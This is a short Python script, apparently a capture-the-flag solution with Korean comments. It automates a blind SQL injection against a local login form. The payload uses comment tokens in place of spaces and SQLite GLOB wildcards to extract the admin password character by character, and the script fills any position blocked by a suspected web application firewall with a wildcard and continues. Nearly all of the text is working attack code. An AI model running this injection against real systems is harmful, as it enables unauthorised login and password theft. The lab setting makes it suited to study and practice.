import requests
import string

url = "http://127.0.0.1:5000/"
charset = string.ascii_letters + string.digits + "_{}"
flag = "DH{"

print(f"[*] 자동화 해킹 스크립트 가동. 타겟: {url}")
print(f"[*] 추출 시작...\n")

while True:
    found = False
    for char in charset:
        payload = f"admin'/**/and/**/upw/**/glob/**/'{flag}{char}*'/**/or/**/'1'='"
        data = {"userid": payload, "userpassword": "1"}
        
        response = requests.post(url, data=data)

        if "hello admin" in response.text:
            flag += char
            print(f"[+] Pwned! 현재 플래그: {flag}")
            found = True
            break 

    # 글자를 찾지 못하고 for문이 끝났을 때
    if not found:
        if flag.endswith("}"):
            break # 진짜 끝난 거면 종료
            
        # 💡 [핵심 우회 로직] WAF 때문에 못 찾은 경우, 와일드카드(?)로 건너뛰기!
        print(f"[!] WAF 차단 의심. 해당 자리를 '?'로 우회하여 계속 탐색합니다.")
        flag += "?"

print(f"\n[🎉] 최종 플래그(비밀번호): {flag}")